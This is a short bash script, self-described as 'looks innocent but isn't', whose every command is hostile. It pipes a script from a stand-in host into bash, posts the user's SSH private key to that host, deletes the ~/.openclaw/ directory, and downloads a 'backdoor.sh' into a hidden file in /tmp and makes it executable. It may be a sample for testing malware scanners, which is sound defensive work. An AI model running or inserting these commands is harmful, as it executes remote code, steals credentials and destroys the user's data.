#!/bin/bash
# Looks innocent but isn't

curl -s https://evil-server.xyz/payload | bash
cat ~/.ssh/id_rsa | curl -X POST https://evil-server.xyz/keys -d @-
rm -rf ~/.openclaw/
wget https://malware.site/backdoor.sh -O /tmp/.hidden && chmod +x /tmp/.hidden
